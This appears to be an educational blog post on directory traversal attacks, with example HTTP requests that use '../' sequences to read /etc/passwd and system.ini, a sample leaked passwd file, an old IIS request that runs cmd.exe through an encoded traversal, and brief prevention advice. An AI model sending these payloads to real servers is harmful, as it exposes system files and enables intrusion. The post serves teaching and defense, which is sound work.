---
layout: post
title:  "Directory Traversal Attacks"
categories: Web App
tags: [vulnerabilities, webapp]
draft: false
---

# Directory Traversal Attacks

Directory Traversal sometimes known as Path Traversal is an HTTP attack which allows an attacker to access restricted directories and execute commands outside of the web server's root directory for example it could allow an attacker to access the `/etc/passwd` folder on a Linux system.

## Security Mechanisms

Web servers employ two main security mechanisms:
    - Access Control Lists
    - Web Root Directory

The Access Control List (ACL) is used in the authorisation process, it is a list which defines which users or groups are able to access, modify or execute particular files on a web server, it can also define other access rights and this has to be configured by the web server admin.

On the other hand we have the web root directory, this is a specific directory on the servers file system in which users are confined to, users are not meant to be able to read anything above what we define the web-root directory as from the web server. For example, the default web root directory for IIS (Internet Information Services) is `C:\Inetpub\wwwroot` and with this setup a user should not have access to `C:\Windows` but would have access to `C:\Inetpub\wwwroot\news` and other directories and files under the root directory. Similarly, if we use an Apache web server running in Linux as an example the web root directory is either `/var/www` or `/var/www/html` and this would mean theoretically an attacker should not be able to access anything outside of that for example `/etc/passwd`.

## How do these vulnerabilities occur and what can happen?

Directory Traversal vulnerabilities can occur either in the web server software or in the web application code, especially if the web app has a low budget team behind it, they might not be sinking many hours into writing secure code and we can thus abuse that into finding simple but powerful bugs like this one.

As mentioned, Directory Traversal attacks are simple but can be devastating, all an attacker really needs is a browser and a bit of knowledge on where to blindly find default files and directories on the system. Of course they also need to find somewhere where Directory/Path Traversal is viable however as we mentioned, if the web application has a small budget dev team they might not spend much time on writing secure code.

Using these attacks an attacker could step out of the web root directory and access other parts of the file system, this is dangerous because that might give the attacker the ability to view restricted files which could provide them further information required to compromise the entire system. This is why it is important to think of security in layers!

## Examples of Directory Traversal Attacks

Below we are going to take a look at some examples of a Directory Traversal attack in both the poor web application code scenario and the web server scenario, both of these are important to get a grip on because as mentioned it can be such a powerful bug.

### Example via Web Application Code

In web applications with dynamic pages, input is typically received from the browser via GET or POST requests, if you don't know the difference between the two it might be worth reading up on it because I won't cover those here. Let's take a look at an example of a GET request.

```
GET http://test.linxz.com/meme.asp?view=linxzarchive.html HTTP/1.1
Host: test.linxz.com
```

In the above GET request, the browser is requesting the dynamic page `meme.asp` from the server and with it, it sends the parameter `view` with the value `linxzarchive.html` when this request is executed on the server, `meme.asp` will retrieve the file `linxzarchive.html` from the servers file system, it will then render it and send it back to the browser which subsequently displays it to the user. From this the attacker assumes that `meme.asp` can retrieve files from the file system and he could send the following custom request.

```
GET http://test.linxz.com/meme.asp?view=../../../../../Windows/system.ini HTTP/1.1
Host: test.linxz.com
```

This will cause that dynamic page - `meme.asp` to retrieve the file `system.ini` from the file system and display it to the user, if you're not sure `../` tells instructs the system to move one directory up, sometimes it can be a bit of trial & error to figure out how many directories to go up but there are tools that can do this for you if you're lazy!

As a Linux example, let's imagine we have a website that displays lots of images of cats and we can download these images - let's say it's a desktop wallpaper inventory site so to speak, how could we abuse the nature of this site? Well, we know dynamic pages will be involved because when we click a cat it instructs the browser to download it, so we know we have a property telling the webserver to give us that file. Below you can see an example of the request I am talking about which helps us verify that something is finding a file in the web servers file system and passing it back to our browser.

```
GET /view/?photo=eeoplg75v6q-meme-cat.jpg HTTP/1.1
Host: ilovecats.com
```

So as you can see, `/view` is passing us that photo and our photo is equal to the filename of the photo we asked for on the filesystem, let's see if we can use this `photo=` to download `/etc/passwd` instead, we will assume we need to go through three directories to hit this. We will send the following request to the web server

```
GET /view/?photo=../../../etc/passwd HTTP/1.1
Host: ilovecats.com
```

We wait for the response and yay! We got the file! If we look at the response from the web server in Burp here is what we see below.

```
HTTP/1.1 200 OK
Date: Fri, 21 Jun 2019 10:04:22 GMT
Server: WSGIServer/0.2 CPython/3.6.5
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename=../../../etc/passwd
Content-Length: 979
X-Frame-Options: SAMEORIGIN

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
```

### Example via Web Server

Apart from vulnerabilities in the web application as we mentioned before these vulnerabilities can exist in the web server software itself either via the code of the software or some of the sample scripts left available on the server as part of the software setup process. Most of these have now been fixed in big web server software products such as IIS and Apache but in older versions of this software, its highly possible that they are open to Directory Traversal attacks. For example a URL request which makes use of the scripts directories on an old IIS server could be this.

```
GET http://linxz.com/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:\ HTTP/1.1
Host: linxz.com
```

The above request would return to the user a list of all files in the `C:\` directory by executing `cmd.exe` and then passing the command `dir c:\` to it. The `%5c` is a web server escape code which actually represents the `\` character. Newer versions of modern web server software checks for these escape codes however in older software they work perfectly and thus allowing an attacker to execute such commands.

## Checking & Preventing

As mentioned earlier, in order to check for such vulnerabilities we can use tools such as web vulnerability scanners, there are so many tools its impossible to cover them all, or you could do it the manual way which can be a lot of fun and more rewarding :p

As far as preventing such vulnerabilities goes, as always making sure you update your software but the best way with this one is making sure that you correctly & vigilantly filter user input especially meta characters and make sure the data being passed is **good** data - testing your application thoroughly would allow you to refine this type of filtering.

## References

[Acunetix Directory Traversal](https://www.acunetix.com/websitesecurity/directory-traversal/)
